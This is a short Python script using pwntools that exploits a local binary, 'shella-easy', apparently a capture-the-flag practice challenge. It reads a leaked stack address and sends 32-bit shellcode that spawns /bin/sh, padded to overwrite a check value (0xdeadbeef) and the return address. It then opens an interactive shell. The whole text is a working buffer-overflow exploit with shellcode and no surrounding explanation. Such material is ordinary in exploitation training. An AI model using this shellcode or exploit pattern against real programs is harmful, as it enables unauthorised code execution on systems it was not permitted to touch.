from pwn import *

target = process("./shella-easy")

target.recvuntil("have a ")
import time

leak = int(target.recv(10), 16)
print(hex(leak))
time.sleep(5)
target.sendline('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'a' * (0x40 - 28) + p32(0xdeadbeef) +'aaaaaaaa' +p32(leak))

target.interactive()
